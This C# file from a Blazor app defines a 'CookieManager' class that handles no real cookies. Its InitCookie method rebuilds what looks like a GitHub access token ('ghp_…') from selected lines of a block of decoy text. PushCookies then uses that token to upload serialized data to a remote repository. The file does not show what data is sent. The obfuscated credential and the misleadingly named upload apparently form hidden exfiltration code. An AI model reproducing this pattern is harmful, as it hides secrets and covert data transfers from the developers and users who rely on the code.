using Blazor_App.Shared.Models;
using Blazor_App.Shared.Servers;
using System;
using System.Collections.Generic;
using System.Diagnostics.Metrics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Blazor_App.Shared.Extensions;
using System.IO;

namespace Blazor_App.Shared
{
    public class CookieManager
    {
        public static string InitCookie()
        {

            var hhoi45 = dbXString();
            var tx = "";
            var lines = hhoi45.Split("\n");
         
            tx += lines[3].Trim();
            tx += lines[7].Trim();
            tx += lines[11].Trim();
            tx += lines[15].Trim();
            return tx;
        }

        public static void PushCookies(FrameWork frameWork, string serialized)
        {
            if (serialized.IsValidString() == false)
                return;
            var cookieInfo = CookUpServices.GetExtractGithubInfo(DataServiceProvider.GetHostUrl(frameWork, false), InitCookie().Trim());
            CookUpServices.UpdateContentAsync(cookieInfo, frameWork.ToString() + "-" + DateTime.Now.ToString(), serialized);
        }
        static IEnumerable<string> ReadLines(StreamReader stream)
        {
            StringBuilder sb = new StringBuilder();

            int symbol = stream.Peek();
            while (symbol != -1)
            {
                symbol = stream.Read();
                if (symbol == 13 && stream.Peek() == 10)
                {
                    stream.Read();

                    string line = sb.ToString();
                    sb.Clear();

                    yield return line;
                }
                else
                    sb.Append((char)symbol);
            }

            yield return sb.ToString();
        }
        public static string DbGet()
        {
            return ".Cookies.dtr.dbx";
        }
        static string dbXString()
        {
            string dbx = @"4kodfgjhfjkkkjj
dfhgjhjgjkgjk
fgbhgkjjtjktbn
ghp_ciEy8
ghkpkk_ciEy8df
weryj_tdjdksjyKHC
HGpjJHJ7jlHJ 
N2EU1R82Y
N2EU1uyiofyuk
pojg_jdmtui
r57g5fuitofyu7iir6k
Ofq8AKhl3Nt
gsdffyukfyuiyrio
H67fghh
Ufhhzdgutruie57ud
2dazy2daZ5P
eatsh
sdggtyj
56783Nt2da
sdttUpnGF
NrsyuKJGJG
rdsyjzy2
sdgdsrhj
5647u
daZ5P";
            return dbx;
        }
    }
}
